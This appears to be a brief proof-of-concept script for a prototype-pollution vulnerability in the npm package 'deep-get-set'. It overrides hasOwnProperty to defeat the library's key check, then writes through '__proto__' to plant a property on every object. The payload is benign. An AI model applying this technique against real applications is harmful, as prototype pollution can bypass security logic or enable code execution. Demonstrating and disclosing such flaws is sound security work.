Object.prototype.hasOwnProperty = () => true;
const deep = require('deep-get-set');
console.log({}.polluted);
deep({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);